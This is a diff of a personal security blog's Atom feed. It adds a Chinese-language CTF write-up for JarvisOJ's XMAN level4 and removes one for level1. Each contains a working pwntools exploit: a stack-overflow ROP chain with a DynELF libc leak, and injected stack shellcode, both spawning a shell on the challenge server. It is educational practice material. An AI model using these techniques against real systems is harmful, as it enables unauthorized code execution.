@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://coldwave96.github.io/"/>
-  <updated>2020-06-19T08:04:30.674Z</updated>
+  <updated>2020-06-22T03:15:45.731Z</updated>
   <id>https://coldwave96.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>XMAN level4 の Write-Up</title>
+    <link href="https://coldwave96.github.io/2020/06/22/XMAN-level4/"/>
+    <id>https://coldwave96.github.io/2020/06/22/XMAN-level4/</id>
+    <published>2020-06-22T00:46:32.000Z</published>
+    <updated>2020-06-22T03:15:45.731Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&emsp;&emsp;这是JarvisOJ的PWN题部分[XMAN]level4的Write-Up，题目思路上和level3一样，只不过在细节处理上有稍微的不一样。本题中由于不知道libc的版本，，所以需要pwntools的DynELF模块寻找函数的内存地址。</p><a id="more"></a><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>&emsp;&emsp;程序运行图：</p><p><img src="/img/XMAN-level4/XMAN1.png" alt=""></p><p>&emsp;&emsp;checksec：32位程序，仅开启DEP保护</p><p><img src="/img/XMAN-level4/XMAN2.png" alt=""></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>&emsp;&emsp;把程序丢到hopper中，发现vulnerable_function函数中的read函数存在溢出漏洞：</p><p><img src="/img/XMAN-level4/XMAN3.png" alt=""></p><p>&emsp;&emsp;但是程序中既找不到system函数也找不到<code>/bin/sh</code>的字符串：</p><p><img src="/img/XMAN-level4/XMAN4.png" alt=""></p><p><img src="/img/XMAN-level4/XMAN5.png" alt=""></p><p>&emsp;&emsp;所以第一反应是和<a href="https://coldwave96.github.io/2020/05/20/XMAN-level3/">level3</a>一样，leak出libc地址然后调用libc中的system函数。</p><p>&emsp;&emsp;但是有个问题是我们不知道libc库的版本，所以我们需要通过pwntools的DynELF来寻找system函数的地址。</p><p>&emsp;&emsp;DynELF是pwntools中专门用来应对没有libc情况的漏洞利用模块，在提供一个目标程序任意地址内存泄露函数的情况下，可以解析任意加载库的人铱符号地址。具体原理解析可以看FREEBUF上的<a href="https://www.freebuf.com/articles/system/193646.html" target="_blank" rel="noopener">Pwntools之DynELF原理探究</a>一文。</p><p>&emsp;&emsp;这样我们的思路就很清楚了：</p><ul><li><p>通过vulerable_function()的read()栈溢出构造ROP创造任意地址内存泄露函数</p></li><li><p>结合上一步的函数，利用DynELF获取libc中的system()函数的真实地址</p></li><li><p>通过vulerable_function()的read()栈溢出构造ROP将‘/bin/sh\x00’通过read()写入bss段</p></li><li><p>通过vulerable_function()的read()栈溢出构造ROP执行system(‘/bin/sh’)得到shell</p></li></ul><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>&emsp;&emsp;直接给出EXP脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">* <span class="comment"># coding:utf-8</span></span><br><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9880</span>)</span><br><span class="line">* elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">* </span><br><span class="line">* write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">* vuln_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">* </span><br><span class="line">* <span class="comment"># 定义leak()泄露任意函数地址</span></span><br><span class="line">* <span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">*     payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(write_plt) + p32(vuln_addr) + p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>)</span><br><span class="line">*     sh.sendline(payload)</span><br><span class="line">*     leak_addr = sh.recv(<span class="number">4</span>)</span><br><span class="line">*     <span class="keyword">return</span> leak_addr</span><br><span class="line">* </span><br><span class="line">* <span class="comment"># 获取sysetem()函数地址</span></span><br><span class="line">* dynelf = DynELF(leak, elf = elf)</span><br><span class="line">* sys_addr = dynelf.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">* </span><br><span class="line">* print(<span class="string">'system addr: '</span> + hex(sys_addr))</span><br><span class="line">* </span><br><span class="line">* read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">* bss_addr = <span class="number">0x804a024</span></span><br><span class="line">* </span><br><span class="line">* <span class="comment"># 往内存中写入shellcode</span></span><br><span class="line">* payload1 = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)</span><br><span class="line">* sh.sendline(payload1)</span><br><span class="line">* sh.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">* </span><br><span class="line">* <span class="comment"># 执行system()函数get shell</span></span><br><span class="line">* payload2 = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bss_addr)</span><br><span class="line">* sh.sendline(payload2)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;脚本运行结果图：</p><p><img src="/img/XMAN-level4/XMAN6.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;这是JarvisOJ的PWN题部分[XMAN]level4的Write-Up，题目思路上和level3一样，只不过在细节处理上有稍微的不一样。本题中由于不知道libc的版本，，所以需要pwntools的DynELF模块寻找函数的内存地址。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
+    
+    
+      <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
+    
+  </entry>
   
   <entry>
     <title>libc &amp;&amp; glibc &amp;&amp; glib 杂谈</title>
@@ -457,29 +480,6 @@
     
     
       <category term="OSCP" scheme="https://coldwave96.github.io/tags/OSCP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>XMAN level1 の Write-Up</title>
-    <link href="https://coldwave96.github.io/2020/05/07/XMAN-level1/"/>
-    <id>https://coldwave96.github.io/2020/05/07/XMAN-level1/</id>
-    <published>2020-05-07T04:10:04.000Z</published>
-    <updated>2020-05-12T07:50:00.860Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&emsp;&emsp;这是JarvisOJ的PWN题部分[XMAN]level1的Write-Up，比较简单。关键点在于当程序中没有现成的shellcode时，如何建立自己的shellcode并在buffer上布局。</p><a id="more"></a><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>&emsp;&emsp;程序运行如下图所示，可见会显示一个奇怪的地址：</p><p><img src="/img/XMAN-level1/XMAN1.png" alt=""></p><p>&emsp;&emsp;还是一样的套路，checksec：32位程序，没有什么特殊的保护措施，并且栈上存在可读可写可执行的部分：</p><p><img src="/img/XMAN-level1/XMAN2.png" alt=""></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>&emsp;&emsp;将程序拖到hopper disassembler中，熟悉的vulnerable_function函数：</p><p><img src="/img/XMAN-level1/XMAN3.png" alt="main函数"></p><p><img src="/img/XMAN-level1/XMAN4.png" alt="vulnerable_function函数"></p><p>&emsp;&emsp;通过vulnerable_function函数的伪C代码可以明白之前出现的那个奇怪的地址其实是泄露的buf地址，那么我们就应该有思路了：</p><p><img src="/img/XMAN-level1/XMAN5.png" alt=""></p><p>&emsp;&emsp;首先左边是正常情况下栈中的布局情况，我们已知的是buf的起始地址。那么我们要做的是将ret的返回地址覆盖为buf的起始地址，这样我们就可以在buf中布局我们的shellcode。</p><p>&emsp;&emsp;右边是理想情况下我们布局后的栈中情况。</p><h2 id="Step-2-1"><a href="#Step-2-1" class="headerlink" title="Step 2"></a>Step 2</h2><p>&emsp;&emsp;找到思路，下面就是EXP的编写了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process('./level1')</span></span><br><span class="line"><span class="comment"># elf = ELF('./level1')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取buf地址</span></span><br><span class="line">buf = sh.recvline()[<span class="number">14</span>:<span class="number">22</span>]</span><br><span class="line"><span class="comment"># 将16进制地址字符串转换成十进制的地址</span></span><br><span class="line">buf_addr = int(buf, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">"A"</span> * (<span class="number">0x88</span> + <span class="number">0x4</span> -len(shellcode)) + p32(buf_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;执行后就可以拿到shell啦：</p><p><img src="/img/XMAN-level1/XMAN6.png" alt=""></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;这是JarvisOJ的PWN题部分[XMAN]level1的Write-Up，比较简单。关键点在于当程序中没有现成的shellcode时，如何建立自己的shellcode并在buffer上布局。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
-    
-    
-      <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
     
   </entry>
   
